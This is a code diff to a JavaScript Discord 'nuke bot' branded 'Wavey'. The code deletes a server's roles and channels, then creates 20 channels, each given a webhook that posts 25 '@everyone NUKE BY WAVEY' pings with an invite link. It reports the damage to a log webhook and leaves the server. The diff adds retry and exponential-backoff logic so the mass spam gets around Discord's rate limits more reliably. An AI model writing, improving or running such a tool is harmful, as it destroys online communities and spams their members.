@@ -9,11 +9,37 @@ const client = new Client({
     ]
 });
 
-const emojis = ['💀', '⚰️', '🦴', '🪦', '⚔️', '🗡️', '🔪', '🩸', '☠️', '👻'];
+const emojis = ['🌊', '💜', '🩷'];
 const discordLink = "https://discord.gg/XrTZWKgXca";
 
-// Delay function to avoid rate limits
-const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+// Better rate limit handler with exponential backoff
+async function sendWithRateLimit(webhookClient, content, maxRetries = 5) {
+    for (let attempt = 0; attempt < maxRetries; attempt++) {
+        try {
+            await webhookClient.send(content);
+            return true;
+        } catch (error) {
+            if (error.code === 429 || error.status === 429) {
+                // Get retry_after from Discord response (in seconds, convert to ms)
+                const retryAfter = (error.retryAfter || error.rawError?.retry_after || 5) * 1000;
+                const backoff = retryAfter + (Math.random() * 1000); // Add jitter
+                console.log(`Rate limited on attempt ${attempt + 1}, waiting ${backoff}ms...`);
+                await new Promise(resolve => setTimeout(resolve, backoff));
+            } else if (error.code === 50035) {
+                // Invalid Form Body - message too long or other issues, skip
+                console.error('Invalid message format, skipping:', error.message);
+                return false;
+            } else {
+                console.error(`Webhook error (attempt ${attempt + 1}):`, error.message);
+                // Exponential backoff for other errors
+                const backoff = Math.pow(2, attempt) * 1000 + (Math.random() * 1000);
+                await new Promise(resolve => setTimeout(resolve, backoff));
+            }
+        }
+    }
+    console.error('Max retries reached, giving up on this message');
+    return false;
+}
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}`);
@@ -111,67 +137,65 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         }
         await Promise.all(rolePromises);
         
-        // Create 20 text channels (reduced from 55) with rate limit handling
-        const channelPromises = [];
+        // Create all 20 channels first
+        const createdChannels = [];
         for (let i = 0; i < 20; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            
-            channelPromises.push(
-                (async () => {
-                    try {
-                        // Create channel
-                        const channel = await guild.channels.create({
-                            name: `Wavey-${randomEmoji}`,
-                            type: 0 // GUILD_TEXT
-                        });
-                        
-                        // Create webhook in this channel
-                        const webhook = await channel.createWebhook({
-                            name: `Wavey-${randomEmoji}`,
-                            avatar: client.user.displayAvatarURL()
-                        });
-                        
-                        const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
-                        
-                        // Send 25 pings with delays to avoid rate limits
-                        for (let j = 0; j < 25; j++) {
-                            try {
-                                await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`);
-                                // Small delay between pings (350ms)
-                                await delay(350);
-                            } catch (error) {
-                                // If rate limited, wait and retry
-                                if (error.code === 429) {
-                                    const retryAfter = error.retryAfter || 5000;
-                                    console.log(`Rate limited, waiting ${retryAfter}ms...`);
-                                    await delay(retryAfter);
-                                    j--; // Retry this ping
-                                } else {
-                                    console.error('Webhook send error:', error);
-                                }
-                            }
-                        }
-                        
-                        // Delete the webhook
-                        await webhook.delete().catch(console.error);
-                        
-                        console.log(`Completed channel ${i + 1}/20`);
-                    } catch (error) {
-                        console.error('Error in channel/webhook:', error);
-                    }
-                })()
-            );
-            
-            // Delay between channel creations to avoid rate limits
-            await delay(500);
+            try {
+                const channel = await guild.channels.create({
+                    name: `Wavey-${randomEmoji}`,
+                    type: 0 // GUILD_TEXT
+                });
+                createdChannels.push(channel);
+                // Small delay between channel creations
+                await new Promise(resolve => setTimeout(resolve, 600));
+            } catch (error) {
+                console.error('Error creating channel:', error);
+            }
         }
         
-        // Wait for ALL channels AND their webhook pings to complete
-        await Promise.all(channelPromises);
+        console.log(`Created ${createdChannels.length} channels, now sending pings...`);
+        
+        // Process channels one at a time to avoid overwhelming rate limits
+        for (let i = 0; i < createdChannels.length; i++) {
+            const channel = createdChannels[i];
+            try {
+                // Create webhook
+                const webhook = await channel.createWebhook({
+                    name: `Wavey-${channel.name}`,
+                    avatar: client.user.displayAvatarURL()
+                });
+                
+                const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
+                
+                // Send 25 pings with proper rate limiting (sequential, not parallel)
+                for (let j = 0; j < 25; j++) {
+                    const success = await sendWithRateLimit(
+                        webhookClient, 
+                        `@everyone NUKE BY WAVEY ${discordLink}`
+                    );
+                    if (!success) {
+                        console.log(`Failed to send ping ${j + 1}/25 in channel ${i + 1}/20`);
+                    }
+                    // 1.5 second delay between pings (respects Discord's ~30/60s limit)
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+                
+                // Delete webhook
+                await webhook.delete().catch(console.error);
+                console.log(`Completed channel ${i + 1}/${createdChannels.length}`);
+                
+                // Delay between channels
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+            } catch (error) {
+                console.error(`Error processing channel ${i + 1}:`, error);
+            }
+        }
         
         console.log('All webhook pings sent!');
         
-        // NOW send log webhook notification
+        // Send log webhook notification
         try {
             const logWebhook = new WebhookClient({ url: process.env.LOG_WEBHOOK });
             const nukeEmbed = new EmbedBuilder()
@@ -184,7 +208,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                     { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                     { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                     { name: '➕ Roles Created', value: '10', inline: true },
-                    { name: '➕ Channels Created', value: '20', inline: true }
+                    { name: '➕ Channels Created', value: createdChannels.length.toString(), inline: true }
                 )
                 .setTimestamp()
                 .setFooter({ text: 'Wavey Nuke Bot' });
@@ -195,7 +219,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
             console.error('Error sending log webhook:', error);
         }
         
-        // NOW leave the server after everything is done
+        // Leave the server after everything is done
         try {
             await guild.leave();
             console.log('Left the server successfully!');
